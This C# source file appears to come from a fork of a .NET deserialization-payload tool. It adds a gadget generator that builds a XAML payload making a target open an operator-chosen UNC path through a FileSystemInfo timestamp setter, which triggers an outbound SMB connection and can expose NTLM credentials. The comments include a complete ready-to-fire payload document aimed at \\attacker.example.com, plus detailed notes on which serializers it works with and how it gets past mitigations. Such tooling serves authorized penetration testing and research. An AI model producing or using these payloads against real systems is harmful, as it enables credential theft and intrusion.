using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * FileSystemInfoTimeSetter: makes the TARGET OPEN a path the operator chose, by driving one
     * of System.IO.FileSystemInfo's six timestamp property SETTERS. Against a UNC path that open
     * is an outbound SMB session.
     *
     * THE SINK, read out of mscorlib (System.IO.FileSystemInfo, v4.0.0.0, b77a5c561934e089).
     * Three of the six members are the real ones and three delegate:
     *
     *   FileSystemInfo.CreationTimeUtc     set -> Directory.SetCreationTimeUtc(FullPath, value)
     *                                             when the instance is a DirectoryInfo,
     *                                             else File.SetCreationTimeUtc(FullPath, value)
     *   FileSystemInfo.LastAccessTimeUtc   set -> Directory/File.SetLastAccessTimeUtc(FullPath, value)
     *   FileSystemInfo.LastWriteTimeUtc    set -> Directory/File.SetLastWriteTimeUtc(FullPath, value)
     *   FileSystemInfo.CreationTime        set -> CreationTimeUtc   = value.ToUniversalTime()
     *   FileSystemInfo.LastAccessTime      set -> LastAccessTimeUtc = value.ToUniversalTime()
     *   FileSystemInfo.LastWriteTime       set -> LastWriteTimeUtc  = value.ToUniversalTime()
     *
     * and each File.SetXxxTimeUtc is
     *
     *   using (OpenFile(path, FileAccess.Write, out handle)) { ... SetFileTime ... }
     *   File.OpenFile -> new FileStream(path, FileMode.Open, access, FileShare.ReadWrite, 1)
     *
     * That is a REAL OPEN of the path. FileMode.Open never creates anything, so a missing remote
     * file still costs the target the SMB connect and the tree connect before it fails. The
     * DirectoryInfo half goes through Directory.SetXxxTimeUtc -> OpenHandle(path)
     * (SafeCreateFile with backup semantics), which reaches the path the same way.
     *
     * WHY THE CONSTRUCTOR ROUTE IS FORCED. FullPath is a protected FIELD. Exactly two things in
     * the whole framework assign it from operator input: the protected
     * FileSystemInfo(SerializationInfo, StreamingContext) constructor, and the public
     * FileInfo(string) / DirectoryInfo(string) constructors. So a payload has to CONSTRUCT the
     * carrier with the path AND THEN assign a property. With FullPath left null the setter throws
     * before it touches anything.
     *
     * WHY XAML IS THE ONLY FORMATTER. That "construct with an argument, then set a member" pair
     * splits the whole catalogue in one step:
     *
     *   - a serializer that drives the ISerializable CONSTRUCTOR (BinaryFormatter, SoapFormatter,
     *     LosFormatter, NetDataContractSerializer, DataContractSerializer,
     *     DataContractJsonSerializer, Json.NET) rebuilds the object inside that constructor and
     *     never assigns a property afterwards, so a timestamp key in the document is read into
     *     SerializationInfo and ignored. That route is the shipped FileSystemInfo gadget;
     *   - a serializer that sets members BY NAME cannot write the protected FullPath field and
     *     cannot construct either carrier, because neither has a public parameterless
     *     constructor. JavaScriptSerializer, YamlDotNet, SharpSerializerXml, SharpSerializerBinary
     *     and XmlSerializer all fail there; FastJson builds an uninitialized instance, which
     *     leaves FullPath null so the setter throws with no network touch; MessagePack Typeless
     *     matches constructor parameters against serialized MEMBER names, and "fileName"/"path"
     *     is not a member;
     *   - FsPickler refuses the TYPE at pickler resolution, because FileSystemInfo derives from
     *     MarshalByRefObject (the same refusal the public sibling documents).
     *
     * XAML is the one format here that does both: x:Arguments picks the (string) constructor and
     * a property element then assigns the member. Delivery to any other format is by CHAINING,
     * not by widening this list:
     *
     *   -g WorkflowDesigner -bgc FileSystemInfoTimeSetter -f Json.NET -c \\host\share\x
     *
     * WHAT THIS ADDS OVER THE PUBLIC FileSystemInfo GADGET. That one fires inside the
     * serialization constructor, through Path.GetFullPathInternal -> LongPathHelper.Normalize ->
     * TryExpandShortFileName -> GetLongPathNameW, so it only calls out when some path COMPONENT
     * contains "~" and is at most 12 characters. THIS gadget needs no short name anywhere: a
     * plain \\host\share\x is opened directly. The two share no formatter and neither is a
     * superset of the other.
     *
     * WHAT A CALLBACK PROVES. That the target resolved the host and tried to open the path. It is
     * not proof of a completed SMB session, of NTLM authentication, of captured credentials or of
     * a relay - those depend on the target, the network and the endpoint. Against a path the
     * target can write, it also really does set that timestamp; that is the second, local effect.
     *
     * RestrictiveXamlXmlReader (the CVE-2020-0605/0606 mitigation used by the WPF clipboard and
     * XPS sinks) DROPS this document silently: it is an allowlist that keeps only System.Windows
     * DependencyObject subclasses and primitives, and System.IO.FileInfo is neither. Stated here
     * rather than tested - the rule is already settled for every non-System.Windows XAML carrier.
     *
     * -t IS ACCEPTED and behaves as it does on the other network gadgets: it deserializes the
     * payload in THIS process, so THIS machine opens the path. Against a UNC path that is the
     * callback, with the authentication material Windows sends when it opens an SMB session.
     * Against an existing LOCAL file it changes that file's timestamp. FileMode.Open means it
     * never CREATES a file. The option help says all of it.
     *
     * The generator never constructs a real FileInfo or DirectoryInfo. It only writes text.
     */
    public class FileSystemInfoTimeSetterGenerator : GenericGenerator
    {
        // The two concrete carriers. FileSystemInfo is abstract and its timestamp members are
        // inherited, so the document names one of these. Public so the tests assert the exact
        // names the product emits instead of a copy of them.
        public const string DirectoryInfoClrName = "System.IO.DirectoryInfo";
        public const string FileInfoClrName = "System.IO.FileInfo";

        // XAML's xmlns takes an assembly NAME, not a display name, which is why this is the
        // simple name and not the full mscorlib identity.
        public const string MscorlibAssemblyName = "mscorlib";

        public const string ClrNamespaceIO = "clr-namespace:System.IO;assembly=" + MscorlibAssemblyName;
        public const string ClrNamespaceSystem = "clr-namespace:System;assembly=" + MscorlibAssemblyName;
        public const string XamlLanguageNamespace = "http://schemas.microsoft.com/winfx/2006/xaml";

        // The six settable timestamp members, in the order this help lists them. Every one of
        // them reaches the same open; they differ only in the member NAME on the wire, which is
        // what a target-side rule or a log matches on.
        public const string CreationTimeMember = "CreationTime";
        public const string CreationTimeUtcMember = "CreationTimeUtc";
        public const string LastAccessTimeMember = "LastAccessTime";
        public const string LastAccessTimeUtcMember = "LastAccessTimeUtc";
        public const string LastWriteTimeMember = "LastWriteTime";
        public const string LastWriteTimeUtcMember = "LastWriteTimeUtc";

        public static readonly string[] TimestampMembers =
        {
            CreationTimeMember, CreationTimeUtcMember,
            LastAccessTimeMember, LastAccessTimeUtcMember,
            LastWriteTimeMember, LastWriteTimeUtcMember,
        };

        public const string DefaultMemberName = LastWriteTimeUtcMember;

        // The timestamp the payload writes. A FIXED constant, not an option: the effect does not
        // depend on the value (the open happens before the value is used), and a constant is what
        // lets a test assert "this payload wrote this file" rather than "something happened".
        //
        // ISO-8601 round-trip, and that spelling is load bearing. XAML converts a DateTime through
        // DateTimeConverter2 -> DateTimeValueSerializer, which parses INVARIANTLY; a locale
        // formatted date would parse here and fail on a target with another culture.
        public const string TimestampLiteral = "2001-02-03T04:05:06.0000000";

        public const int VariantDirectoryInfo = 1;
        public const int VariantFileInfo = 2;

        // Canonical long names of the options, so the generator, its help and the tests cannot
        // drift apart.
        public const string VariantOptionName = "variant";
        public const string MemberOptionName = "member";
        public const string RawInputOptionName = "rawinput";

        private int variantNumber = VariantDirectoryInfo;
        private string memberName = DefaultMemberName;
        private bool rawInput;

        // ---- Metadata ----------------------------------------------------------

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                // Network: the open of a UNC path is an outbound SMB session. FileSystem: against
                // a path the target can write, the setter really does change that timestamp, which
                // the runtime-effect row observes on a real file.
                .WithKinds(PayloadKind.Network, PayloadKind.FileSystem)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // 4.0 is the floor this project records; 4.8.1 is where the setter was observed
                // writing a real file by the FileSystemInfoTimeSetterWritesATimestamp row.
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // James Forshaw documented FileSystemInfo as a path sink reachable from deserialization,
        // which is the attribution the FileSystemInfo gadget carries. The timestamp-setter
        // route to that same type, and the x:Arguments delivery below, come from this checkout's
        // own research sweep rather than from published work.
        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Two short sentences: this is the FIRST block of the interactive info panel and a long
        // one pushes the formatter, command-input and category lines off the screen.
        public override string AdditionalInfo()
        {
            return "Sets a timestamp on the path you give, on the target. Any UNC path opens an "
                + "SMB session to that host - no short name needed.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and names a framework type of its own.
            return new List<string> { GadgetTags.Independent };
        }

        // Xaml alone, and the reason is structural rather than unexplored: see the header block.
        // The "(2)" suffix is the display-only annotation meaning "this formatter carries 2
        // variants"; both variants produce the same document with one type token changed, so
        // neither narrows the list.
        public override List<string> SupportedFormatters()
        {
            return new List<string> { Formatters.Xaml + " (2)" };
        }

        // -c is a path the TARGET opens. Nothing is opened, resolved or contacted while the
        // payload is built. A UNC path is what makes it interesting, so the wizard prompts for
        // one, but any path string is accepted: what a target does with it is the thing an
        // operator uses this gadget to find out.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.UncPath;
        }

        public override List<GadgetVariant> Variants()
        {
            // Both variants take the same input, carry the same member and produce the same
            // document shape, so neither narrows the formatter list and neither overrides the
            // facets.
            return new List<GadgetVariant>
            {
                new GadgetVariant(VariantDirectoryInfo,
                    "System.IO.DirectoryInfo (default) - Directory.SetXxxTimeUtc"),
                new GadgetVariant(VariantFileInfo,
                    "System.IO.FileInfo - File.SetXxxTimeUtc, which opens the path for write"),
            };
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|" + VariantOptionName + "=",
                    "Which concrete FileSystemInfo the payload constructs. Both reach the same "
                        + "open of your path; they differ in which framework helper gets there.\r\n"
                        + VariantDirectoryInfo + " (default) - " + DirectoryInfoClrName
                        + ". The setter calls Directory.SetXxxTimeUtc, which opens a handle with "
                        + "backup semantics.\r\n"
                        + VariantFileInfo + " - " + FileInfoClrName + ". The setter calls "
                        + "File.SetXxxTimeUtc, which is new FileStream(path, FileMode.Open, "
                        + "FileAccess.Write, FileShare.ReadWrite, 1).\r\n"
                        + "\r\n"
                        + "WHAT TO PUT IN -c. Any path the target's file system accepts. The "
                        + "interesting shape is a plain UNC path:\r\n"
                        + "  \\\\attacker.example.com\\share\\x\r\n"
                        + "Unlike the serialization-constructor route, nothing here needs an "
                        + "MS-DOS short-name (\"~\") component: the path is opened directly, so "
                        + "any UNC path reaches the host. FileMode.Open never creates a file, so "
                        + "a share that does not exist still costs the target the connect.\r\n"
                        + "\r\n"
                        + "WHAT A CALLBACK PROVES. That the target resolved your host and tried "
                        + "to open the path. It does NOT prove a completed SMB session, NTLM "
                        + "authentication, captured credentials or a relay: those depend on the "
                        + "target, the network and your endpoint.",
                    v => int.TryParse(v, out variantNumber)
                },
                {
                    // Metadata below carries the complete member default and choice set.
                    MemberOptionName + "=",
                    "Which timestamp property the payload assigns.\r\n"
                        + "Choices: " + string.Join(", ", TimestampMembers) + ". "
                        + "Default: \"" + DefaultMemberName + "\".\r\n"
                        + "\r\n"
                        + "All six reach the same open of -c, so the choice matters only for a "
                        + "target that filters, logs or matches on the member NAME. The three "
                        + "ending in Utc are the real setters; the other three assign their Utc "
                        + "twin after ToUniversalTime(), which is the same sink one frame further "
                        + "out.\r\n"
                        + "\r\n"
                        + "The timestamp value is fixed at " + TimestampLiteral + " and is not an "
                        + "option, because the open happens before the value is used, so it "
                        + "changes nothing about whether the payload lands.\r\n"
                        + "\r\n"
                        + "-t IS ACCEPTED and it deserializes the payload HERE, so THIS machine "
                        + "opens the path you named - the same as on the other network gadgets. "
                        + "Against a UNC path that is your callback, and Windows sends "
                        + "authentication material when it opens an SMB session, so only point it "
                        + "at an endpoint you own. Against an existing LOCAL file it really does "
                        + "change that file's timestamp to the value above. FileMode.Open means it "
                        + "never creates a file that was not there.",
                    v => { if (v != null) memberName = v.Trim(); }
                },
                {
                    RawInputOptionName,
                    "Put -c into the payload template exactly as typed, instead of escaping it for "
                        + "XML. Normal mode escapes \"&\", \"<\" and \">\", which is what the text "
                        + "node holding your path needs. Use this only when you have already "
                        + "escaped the value yourself. It also turns off the check that the "
                        + "finished payload still carries your path unchanged, because there is "
                        + "then no text of yours left to compare against.",
                    v => { if (v != null) rawInput = true; }
                },
            }
            .WithMetadata("variant", OptionMetadata.ForVariants(Variants()))
            .WithMetadata("member", new OptionMetadata(defaultValue: DefaultMemberName, choices: TimestampMembers))
            .WithMetadata("rawinput", new OptionMetadata(defaultValue: "false"));
        }

        // ---- Generation --------------------------------------------------------

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);
            GuardVariantFormatter(variantNumber, formatter);
            if (!IsFormatter(formatter, Formatters.Xaml))
                throw UnsupportedFormatter(formatter);

            string path = inputArgs.Cmd;
            string document = BuildXamlDocument(BareTargetTypeName(), MemberName(), path);

            // Build and CHECK with the self-test OFF first, so a path --minify rewrote is refused
            // BEFORE -t can open the wrong one. -t here really opens the path on this machine, so
            // the order matters the same way it does on TempFileCollection.
            InputArgs probeArgs = inputArgs.DeepCopy();
            probeArgs.Test = false;
            object probe = FinishHandWrittenPayload(document, formatter, probeArgs);
            RequirePathArrivesIntact(probe, path, inputArgs);

            if (!inputArgs.Test)
                return probe;

            // -t was asked for: rebuild with the self-test on, which deserializes the document
            // here and performs the open. The path is already proven to have survived, so the
            // self-test can never operate on a rewritten one.
            return FinishHandWrittenPayload(document, formatter, inputArgs);
        }

        // ---- The payload document ----------------------------------------------

        // The whole payload, as one readable document. Copy it into
        // Helpers/TestingArena/TestingArenaHome.cs (or any scratch project) and hand it to
        // XamlReader.Load and it fires as it stands.
        //
        //   <FileInfo xmlns="clr-namespace:System.IO;assembly=mscorlib"
        //             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        //             xmlns:s="clr-namespace:System;assembly=mscorlib">
        //     <x:Arguments>
        //       <s:String xml:space="preserve">\\attacker.example.com\share\x</s:String>
        //     </x:Arguments>
        //     <FileInfo.LastWriteTimeUtc>2001-02-03T04:05:06.0000000</FileInfo.LastWriteTimeUtc>
        //   </FileInfo>
        //
        // Three shape rules, none of which may be "tidied away":
        //
        //  1. x:Arguments comes FIRST and the timestamp is a property ELEMENT, not an attribute
        //     on the start tag. Neither carrier has a parameterless constructor, so the object
        //     does not exist until the writer has read the arguments; a member on the start tag
        //     asks the writer to assign before construction.
        //  2. The timestamp text is ISO-8601 round-trip, because the DateTime conversion is
        //     invariant (see TimestampLiteral).
        //  3. The member is named on the ELEMENT's own type (FileInfo.LastWriteTimeUtc) even
        //     though the property is declared on FileSystemInfo. That is how XAML names an
        //     inherited member.
        //
        // xml:space="preserve" is on the argument element because the path is the payload: XAML
        // normalizes whitespace in element content by default, which would silently rewrite a
        // path with a leading, trailing or repeated space into a different path.
        private string BuildXamlDocument(string bareTypeName, string member, string path)
        {
            string value = EscapeForXmlAttribute(path, rawInput);

            return @"<" + bareTypeName + @" xmlns=""" + ClrNamespaceIO + @"""
          xmlns:x=""" + XamlLanguageNamespace + @"""
          xmlns:s=""" + ClrNamespaceSystem + @""">
  <x:Arguments>
    <s:String xml:space=""preserve"">" + value + @"</s:String>
  </x:Arguments>
  <" + bareTypeName + "." + member + ">" + TimestampLiteral + @"</" + bareTypeName + "." + member + @">
</" + bareTypeName + ">";
        }

        // ---- The two selectors --------------------------------------------------

        /// <summary>
        /// The bare CLR type name the document is written around. Bare, because a XAML element is
        /// named after the type and the assembly travels in the xmlns.
        /// </summary>
        internal string BareTargetTypeName()
        {
            if (variantNumber == VariantDirectoryInfo)
                return "DirectoryInfo";
            if (variantNumber == VariantFileInfo)
                return "FileInfo";

            throw new ArgumentException(Name() + " has no variant " + variantNumber
                + ". Use --" + VariantOptionName + " " + VariantDirectoryInfo + " ("
                + DirectoryInfoClrName + ") or --" + VariantOptionName + " " + VariantFileInfo
                + " (" + FileInfoClrName + ").");
        }

        /// <summary>
        /// The timestamp member the operator selected, matched case-insensitively against the six
        /// real member names. An unknown value is a "cannot emit" refusal - there is no seventh
        /// member to name - not validation of what the target will do with it.
        /// </summary>
        internal string MemberName()
        {
            foreach (string known in TimestampMembers)
                if (string.Equals(known, memberName, StringComparison.OrdinalIgnoreCase))
                    return known;

            throw new ArgumentException(Name() + " has no timestamp member \"" + memberName
                + "\". Use --" + MemberOptionName + " with one of: "
                + string.Join(", ", TimestampMembers) + ".");
        }

        // ---- Path fidelity ------------------------------------------------------

        // The path IS the payload, so a payload whose text was rewritten is worse than no
        // payload: it still deserializes and simply opens a path nobody meant. Two things in this
        // project rewrite text in an XML payload (the XML minifier, and an XmlWriter's newline
        // handling), so the rule is the catalogue's: VERIFY the emitted document, never predict
        // which characters are at risk.
        private void RequirePathArrivesIntact(object payload, string path, InputArgs inputArgs)
        {
            // --rawinput means the operator took responsibility for the exact bytes in the
            // template, so there is nothing here to compare their text against.
            if (rawInput || MinifiedTextGuard.MissingTextValues(payload, new[] { path }).Count == 0)
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            throw new ArgumentException(Name() + " cannot deliver this path with " + Formatters.Xaml
                + (minified ? " and --minify" : "") + ": the payload no longer carries \"" + path
                + "\" exactly, so the target would open a different path."
                // Measured on THIS document rather than copied from a sibling: the XML minifier
                // trims leading and trailing whitespace off every text node, while repeated
                // interior spaces and a "; " sequence both survive here. The two losses have to
                // be SEPARATED, because they are not recovered by the same thing: a carriage
                // return goes with no minifier at all, to XML's own mandatory line-ending
                // normalization, so "Drop --minify" on its own is a dead end for one. The
                // catalogue-wide advice sweep proves this by building the value a second time.
                + (minified
                    ? " Use a path with no leading or trailing whitespace in the value and no"
                        + " carriage return; dropping --minify recovers the leading and trailing"
                        + " whitespace, and nothing else."
                    : " Use a path with no carriage return: the value travels in XML element"
                        + " text, and no parser can carry one there."));
        }
    }
}
